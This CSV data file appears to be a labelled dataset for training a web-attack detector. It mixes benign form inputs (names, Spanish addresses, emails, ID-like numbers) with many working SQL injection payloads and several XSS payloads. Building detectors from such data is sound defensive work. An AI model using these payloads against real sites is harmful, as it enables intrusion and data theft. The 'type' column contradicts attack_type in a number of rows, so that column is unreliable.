Text,attack_type,Label,type
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",sqli,1,sql
5630456632018872,norm,0,normal
kale,norm,0,normal
orencia,norm,0,normal
travesia de fernando sasiain 35 2?c,norm,0,normal
"c/ rio cea, 77,",norm,0,normal
celada lurhmann,norm,0,normal
"1) as ekgx where 9923=9923 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-6067'+(select 'bfhf' where 3114=3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",sqli,1,sql
"1""));begin user_lock.sleep(5); end and ((""kvts"" like ""kvts",sqli,1,sql
dopico juanes,norm,0,normal
1));select pg_sleep(5) and ((4382=4382,sqli,1,sql
roco del cielo,norm,0,normal
desequilibrar,norm,0,normal
1190073859148781,norm,0,normal
gabarri,norm,0,normal
doerksen,norm,0,normal
en683$67,norm,0,normal
7a03i9a08rio,norm,0,normal
bubnjar cangalaya,norm,0,normal
"1%"")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""%""=""",sqli,1,sql
heidemann@ppmanzanares.cg,norm,0,normal
storgaard-szibo3@elreversotenebroso.ky,norm,0,normal
puppato marnetti,norm,0,normal
srdida.me3te,norm,0,normal
8912,norm,0,normal
"carretera nacional 139, 9?a",norm,0,normal
"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""tlpw""=""tlpw",sqli,1,sql
batidor,norm,0,normal
nissen@hipersevilla.af,norm,0,normal
nona,norm,0,normal
blanchet,norm,0,normal
bhatti,norm,0,normal
45854746z,norm,0,normal
60578448j,norm,0,normal
"1"") as axua where 6718=6718;if(8264=1939) select 8264 else drop function nsoq--",sqli,1,sql
scriptdocument.cookie=true;/script,xss,2,sql
surai,norm,0,normal
4451,norm,0,normal
5561938510666442,norm,0,normal
1728750094813990,norm,0,normal
a3ui11d,norm,0,normal
cowart,norm,0,normal
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('atyf'='atyf",sqli,1,sql
20,norm,0,normal
reco.cida,norm,0,normal
salobral,norm,0,normal
rocquemore@spainbb.um,norm,0,normal
descabellar,norm,0,normal
"""-o-link:'javascript:alert(1)';-o-link-source:current"">x</a>",xss,2,xss
buisn andres,norm,0,normal
emetrio,norm,0,normal
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'obax' like 'obax",sqli,1,sql
lyston@classroommanager.co,norm,0,normal
37609,norm,0,normal
guang1?che,norm,0,normal
guaita zaragoza,norm,0,normal
d9a32ado,norm,0,normal
mazarick1,norm,0,normal
lcera,norm,0,normal
hornos,norm,0,normal
-8163)) as cvai where 2360=2360 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"calle duque de ahumada, 67,",norm,0,normal
arguisuelas,norm,0,normal
41720,norm,0,normal
v5llo34,norm,0,normal
valdano,norm,0,normal
"1))) union all select null,null,null,null,null#",sqli,1,sql
"1"" waitfor delay '0:0:5'",sqli,1,normal
bernaus,norm,0,normal
(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (5877=5877) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)),sqli,1,sql
"-9150%'))) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",sqli,1,sql
lilias,norm,0,normal
25938703q,norm,0,normal
"1'+(select niht where 7294=7294 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
8520476642865434,norm,0,normal
casiodoro,norm,0,normal
-2983') or 8571=8571--,sqli,1,sql
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""rkry"" like ""rkry",sqli,1,sql
rini,norm,0,normal
"1)) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((5137=5137",sqli,1,sql
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg",sqli,1,sql
15820845l,norm,0,normal
7505555834849363,norm,0,normal
-8074') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lnwm'='lnwm,sqli,1,sql
48872890y,norm,0,normal
hontanares de eresma,norm,0,normal
santa catalina 81,norm,0,normal
"1' where 6795=6795 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
bediaga,norm,0,normal
heping,norm,0,normal
"camino el pino, 151, 5-b",norm,0,normal
delemos altimirs,norm,0,normal
"1"") as ltoa where 9159=9159 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
40a5e,norm,0,normal
baldomera,norm,0,normal
colliti.shale@ropadegolf.com.dd,norm,0,normal
oficial ribe,norm,0,normal
2293,norm,0,normal
-3359' order by 1--,sqli,1,sql
riordan,norm,0,normal
88903644l,norm,0,normal
depp@rpdkorea.il,norm,0,normal
09109,norm,0,normal
cervera del ro alhama,norm,0,normal
cortes de la frontera,norm,0,normal
1175,norm,0,normal
"1"") as saqy where 9704=9704 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
"c/ valdes salas, 39 11?c",norm,0,normal
lttecke,norm,0,normal
6708008477094577,norm,0,normal
he53e9ona,norm,0,normal
08263,norm,0,normal
"1))) and 3824=benchmark(5000000,md5(0x76555642)) and (((6556=6556",sqli,1,normal
"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",sqli,1,sql
"1')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
difusora,norm,0,normal
7406,norm,0,normal
delavanti@brunoseguridad.by,norm,0,normal
8715715387496940,norm,0,normal
a0_idia,norm,0,normal
"1"") as eomu where 6599=6599;select * from generate_series(9167,9167,case when (9167=2273) then 1 else 0 end) limit 1--",sqli,1,sql
1'+(select 'nlvq' where 7528=7528 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
"c/ de las gloxinias 91,",norm,0,normal
guilmett,norm,0,normal
44494,norm,0,normal
"-6942') union all select 7280,7280,7280#",sqli,1,sql
juventino,norm,0,normal
1%'));select (case when (7594=8086) then 7594 else 1/(select 0) end)--,sqli,1,sql
"1') where 4729=4729;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
shaira,norm,0,normal
jan,norm,0,normal
"1"")) as sqow where 8752=8752;select (case when (1726=4080) then 1726 else 1/(select 0) end)--",sqli,1,sql
37711,norm,0,normal
warrello2,norm,0,normal
"1') where 8348=8348 and elt(4249=4249,7259)--",sqli,1,sql
c/ galvan 98 10?a,norm,0,normal
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag",sqli,1,sql
"1' where 4149=4149 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1 and make_set(8403=8403,8899)# zysq",sqli,1,normal
"-2601') union all select 2866,2866,2866,2866,2866,2866--",sqli,1,sql
ortigas huerta,norm,0,normal
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nimx'='nimx",sqli,1,sql
"1"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
25266,norm,0,normal
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('xss')</script>"">",xss,2,xss
donovan,norm,0,normal
naiemias,norm,0,normal
calle tras do colexio s/n,norm,0,normal
"nicaragua, 195,",norm,0,normal
"1' in boolean mode) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
30840,norm,0,normal
1) union all select null--,sqli,1,sql
2s323a657a679,norm,0,normal
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1,sql
tibor,norm,0,normal
"1%"")));begin dbms_lock.sleep(5); end and (((""%""=""",sqli,1,sql
consell,norm,0,normal
desplans,norm,0,normal
phan,norm,0,normal
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni",sqli,1,normal
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('msol'='msol",sqli,1,sql
1;select pg_sleep(5)-- ojzt,sqli,1,sql
azuara,norm,0,normal
47150,norm,0,normal
gino,norm,0,normal
webb@testevelocidad.bg,norm,0,normal
kashfi@cropbay.jobs,norm,0,normal
casares portabella,norm,0,normal
2969,norm,0,normal
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('gwew' like 'gwew",sqli,1,sql
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,1,sql
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vvxk'='vvxk,sqli,1,sql
"1%"")));(select * from (select(sleep(5)))srmq) and (((""%""=""",sqli,1,sql
"-1<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",xss,2,xss
buffet@aou.com.tn,norm,0,normal
48310,norm,0,normal
"calle paloma 101,",norm,0,normal
413f1go,norm,0,normal
"1%""));begin user_lock.sleep(5); end--",sqli,1,sql
furia@gallegonicolas.bf,norm,0,normal
casavieja carriquiri,norm,0,normal
"1%"");select case when 7717=7717 then 1 else null end--",sqli,1,sql
bazet aguil,norm,0,normal
1'+(select 'wyxu' where 2555=2555 union all select null#,sqli,1,sql
chusma,norm,0,normal
"1' union all select null,null,null,null,null#",sqli,1,sql
97,norm,0,normal
"conde de olocau, s/n, 3g",norm,0,normal
2238,norm,0,normal
"1'qhfy<'"">utwq",sqli,1,normal
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))-- uslt",sqli,1,sql
"1"")) and make_set(8266=9226,9226) and ((""omjx"" like ""omjx",sqli,1,normal
resquebrar,norm,0,normal
jabes,norm,0,normal
5714386014521039,norm,0,normal
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,sqli,1,sql
"1"") rlike (select (case when (8732=6244) then 1 else 0x28 end)) and (""unuk""=""unuk",sqli,1,sql
gallinero de cameros,norm,0,normal
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('sdnc'='sdnc",sqli,1,sql
n2ga1,norm,0,normal
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zpyx'='zpyx",sqli,1,sql
brightwe,norm,0,normal
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('pbqg'='pbqg",sqli,1,normal
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('%'='",sqli,1,sql
6341227779092516,norm,0,normal
figuerola,norm,0,normal
"-7945%'))) union all select 4286,4286,4286,4286,4286,4286--",sqli,1,sql
1%'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',sqli,1,sql
70,norm,0,normal
84125384d,norm,0,normal
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('dvpw'='dvpw",sqli,1,sql
susinos del pramo,norm,0,normal
cailla,norm,0,normal
"-2715')) union all select 8646,8646,8646,8646,8646,8646,8646,8646--",sqli,1,sql
7656,norm,0,normal
"1"")) as vigs where 6175=6175 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'nbxw'='nbxw,sqli,1,sql
83513142g,norm,0,normal
46266,norm,0,normal
8paam277to,norm,0,normal
"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />",xss,2,xss
c48mari1e5a,norm,0,normal
audelino,norm,0,normal
"1"") where 1144=1144 and 2006=2006",sqli,1,normal
"-1258"")) union all select 7734,7734,7734#",sqli,1,sql
"-9180"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
1346877489776313,norm,0,normal
"1') as nvqk where 3917=3917 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
millian@intelethernet.cc,norm,0,normal
5420336038280470,norm,0,normal
angullo acosta,norm,0,normal
reid5,norm,0,normal
"1"" where 7828=7828;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
1')) as bewk where 3672=3672 or sleep(5)--,sqli,1,sql
4867284155125635,norm,0,normal
yasmmane,norm,0,normal
58305784w,norm,0,normal
"-7831"")) as krzi where 3798=3798 order by 1--",sqli,1,sql
"travesia doctor sanchez, 139, 12?h",norm,0,normal
gas40so,norm,0,normal
"c/ canuda 176, 11b",norm,0,normal
1'));waitfor delay '0:0:5' and (('yjsp' like 'yjsp,sqli,1,sql
es+teatita,norm,0,normal
carapopela,norm,0,normal
8ro4,norm,0,normal
suau,norm,0,normal
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""nwjv""=""nwjv",sqli,1,sql
<iframe src=http://www.vulnerability-lab.com>,xss,2,normal
"1"") where 7471=7471 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
echecopar torrella,norm,0,normal
mahecha barguo,norm,0,normal
"1"") where 1870=1870 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('zurf'='zurf",sqli,1,normal
"-4745"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""nifq"" like ""nifq",sqli,1,sql
7057231009442608,norm,0,normal
1e1ador,norm,0,normal
"-2787')) union all select 1996,1996,1996,1996,1996,1996,1996,1996#",sqli,1,sql
carretera de las ermitas 188,norm,0,normal
37188,norm,0,normal
"c/ mineria, 151 13?g",norm,0,normal
alfaro,norm,0,normal
"1')) as qhpv where 7049=7049 and make_set(8403=8403,8899)--",sqli,1,sql
"pasaje lucero 147,",norm,0,normal
portell de morella,norm,0,normal
hills,norm,0,normal
14977979b,norm,0,normal
nelia3,norm,0,normal
6959239796912888,norm,0,normal
ferrs gortrez,norm,0,normal
cortegada,norm,0,normal
glorieta ramiro ii 61,norm,0,normal
clusella baldom,norm,0,normal
villapando torrontegui,norm,0,normal
08109487d,norm,0,normal
calle leganes 155 13?e,norm,0,normal
1)) as xmac where 7692=7692;begin dbms_lock.sleep(5); end--,sqli,1,sql
1) where 9160=9160;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
adaiana,norm,0,normal
"<img src=`javascript:alert(""rm'crosssitescripting'"")`>",xss,2,xss
"1"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""diiv""=""diiv",sqli,1,normal
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""acbq"" like ""acbq",sqli,1,sql
01212,norm,0,normal
0250216835204033,norm,0,normal
cnico,norm,0,normal
cheyenne,norm,0,normal
99r5na,norm,0,normal
1')) or (select * from (select(sleep(5)))ydpu) and (('ytxg'='ytxg,sqli,1,sql
a7av5nc6,norm,0,normal
"calle fray luis de leon 141, 7?c",norm,0,normal
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('dtym'='dtym",sqli,1,sql
04211,norm,0,normal
-9688%')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',sqli,1,sql
pablo de la cruz,norm,0,normal
-2951 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)# gwqv,sqli,1,sql
steele-kripilani@vendomiatico.se,norm,0,normal
37427,norm,0,normal
"1') where 9842=9842 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
"1'+(select byor where 4538=4538;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'",sqli,1,sql
1' and (3020=3020)*6703 and 'hnvf'='hnvf,sqli,1,normal
kwok,norm,0,normal
incom1a5abl8mente,norm,0,normal
venita,norm,0,normal
59137612n,norm,0,normal
40313,norm,0,normal
3266,norm,0,normal
mageto,norm,0,normal
"1') as jrwx where 6087=6087 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
"germanies 18,",norm,0,normal
7012,norm,0,normal
oroz-betelu,norm,0,normal
"1"")) as qgwq where 6122=6122;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1'||(select 'dajl' from dual where 8440=8440;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
messenger@blanquillos.pk,norm,0,normal
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',sqli,1,sql
quinones,norm,0,normal
19323,norm,0,normal
kazuo,norm,0,normal
"burgos, s/n, 1f",norm,0,normal
-7610' or 3038=3038,sqli,1,normal
royce,norm,0,normal
hacinadora,norm,0,normal
"1') and elt(7554=6257,6257) and ('bpzm'='bpzm",sqli,1,normal
salvatore,norm,0,normal
dabbas hurtado,norm,0,normal
1406,norm,0,normal
">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",xss,2,sql
gowens,norm,0,normal
"1"" and 9198=9198--",sqli,1,sql
04742,norm,0,normal
i4dig6st8bl9,norm,0,normal
vega de san mateo,norm,0,normal
eli,norm,0,normal
sanromn casuso,norm,0,normal
youping,norm,0,normal
irn0co,norm,0,normal
2952,norm,0,normal
genestar llufriu,norm,0,normal
garrotazo,norm,0,normal
"bloc bic, s/n, 12c",norm,0,normal
vaquer gorigoitia,norm,0,normal
"1%')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('%'='",sqli,1,normal
97963158v,norm,0,normal
"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",sqli,1,sql
lora de estepa,norm,0,normal
"1"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""rntg"" like ""rntg",sqli,1,sql
christian,norm,0,normal
"""div1""><input value=""``onmouseover=alert(1)""></div> <div id=""div2""></div>",xss,2,normal
cel65co,norm,0,normal
muskiz,norm,0,normal
"c/ quintana 132, 13?h",norm,0,normal
spano-macary@biosaludsystems.ml,norm,0,normal
"1') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
zaldua taranco,norm,0,normal
donaciano,norm,0,normal
-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt,sqli,1,sql
"1%"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
spry.jochmann@spainbb.sz,norm,0,normal
1' in boolean mode);select (case when (1275=7674) then 1275 else 1275*(select 1275 from information_schema.character_sets) end)#,sqli,1,sql
"1"")) waitfor delay '0:0:5'--",sqli,1,sql
mindy,norm,0,normal
broquel,norm,0,normal
pompa,norm,0,normal
"1))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((4924=4924",sqli,1,sql
"1')) as ovbz where 3203=3203 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
1' where 6583=6583;select case when 4537=8418 then 1 else null end--,sqli,1,sql
"-2667) union all select 5848,5848,5848,5848--",sqli,1,sql
"-3719"" union all select 6609,6609,6609,6609#",sqli,1,sql
"1"") where 8657=8657;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"portugal 87,",norm,0,normal
-2154%' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and '%'=',sqli,1,sql
3948100340900216,norm,0,normal
ga27393,norm,0,normal
sauprobo,norm,0,normal
"1%' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and '%'='",sqli,1,sql
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('qutm'='qutm",sqli,1,normal
"1' in boolean mode) union all select null,null,null,null--",sqli,1,sql
"plaza minayo, 2",norm,0,normal
"1%""));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
ruano barril,norm,0,normal
1')));select sleep(5) and ((('qjsc'='qjsc,sqli,1,sql
9178266136569781,norm,0,normal
"1')) as xebq where 7959=7959 union all select null,null,null,null,null,null#",sqli,1,sql
01478,norm,0,normal
"1""))) and (3020=3020)*6703 and (((""fqap"" like ""fqap",sqli,1,normal
giorgi,norm,0,normal
thieu,norm,0,normal
alejo,norm,0,normal
"<img id=xss src=""javascript:alert('xss');"">",xss,2,xss
noris,norm,0,normal
ajona valenzuela,norm,0,normal
22373,norm,0,normal
"1'))) and make_set(8403=8403,8899) and ((('llfp'='llfp",sqli,1,normal
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",sqli,1,sql
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
kaempfe amilibia,norm,0,normal
"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo",sqli,1,normal
redon-eagles@planesypensiones.mil,norm,0,normal
alek,norm,0,normal
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'aezm' like 'aezm",sqli,1,sql
1279724517252177,norm,0,normal
"1 where 4319=4319 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
e2toc8da,norm,0,normal
bienia,norm,0,normal
5975278199435199,norm,0,normal
catalina mas 53 12b,norm,0,normal
1) as nbno where 9816=9816 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
deighton_pfaudler@ajuntamentdebarcelona20.vn,norm,0,normal
"pl. poeta badenes, 48, 11-c",norm,0,normal
1596,norm,0,normal
14859,norm,0,normal
1729,norm,0,normal
44370,norm,0,normal
brokaw,norm,0,normal
"alcdia de crespins, l'",norm,0,normal
"pl. curro cuchares, 72,",norm,0,normal
50163,norm,0,normal
16926,norm,0,normal
martens,norm,0,normal
j0ctar,norm,0,normal
"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>",xss,2,sql
83609975f,norm,0,normal
8578275476079932,norm,0,normal
"1')) and make_set(8403=8403,8899) and (('sxgl'='sxgl",sqli,1,normal
-7187' or 4159=7465,sqli,1,normal
1')) or 6793=(select 6793 from pg_sleep(5)) and (('zjun'='zjun,sqli,1,sql
6194,norm,0,normal
4005,norm,0,normal
nix@quecole.vc,norm,0,normal
castellanos gdia,norm,0,normal
nanclares espejo,norm,0,normal
"1 where 1186=1186 union all select null,null,null,null,null,null,null#",sqli,1,sql
priado,norm,0,normal
benita,norm,0,normal
27404814s,norm,0,normal
16630,norm,0,normal
-6079))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((8708=8708,sqli,1,sql
1%')));select (case when (9746=8055) then 9746 else 1/(select 0) end)--,sqli,1,sql
"gaspar mendez 173, 3-h",norm,0,normal
cornejoviniero plasencia,norm,0,normal
tandy,norm,0,normal
2461,norm,0,normal
1447,norm,0,normal
-5286' or 6783=1233,sqli,1,normal
balzo@onlinegratis.lv,norm,0,normal
1') rlike (select * from (select(sleep(5)))sgvo) and ('lzbn'='lzbn,sqli,1,sql
2524414881203627,norm,0,normal
1'+(select nsri where 1202=1202 and 4595=4595#,sqli,1,sql
ondara,norm,0,normal
4881,norm,0,normal
ermelindo,norm,0,normal
yactura,norm,0,normal
98993276b,norm,0,normal
58007817t,norm,0,normal
a79ga44,norm,0,normal
c/ buenos aires s/n 6?b,norm,0,normal
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1' in boolean mode) union all select null,null,null,null#",sqli,1,sql
cartaa,norm,0,normal
"calle ingeniero antonio carbonell, 114, 5d",norm,0,normal
"calle muerdago, s/n,",norm,0,normal
80725413j,norm,0,normal
4la3ue95,norm,0,normal
keca@autoconstruccion.cu,norm,0,normal
prats de lluans,norm,0,normal
"1') or elt(5873=5873,sleep(5))#",sqli,1,normal
aguiar claver,norm,0,normal
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""%""=""",sqli,1,sql
reinazgo,norm,0,normal
26222,norm,0,normal
morishige-tombes@quierocortinas.do,norm,0,normal
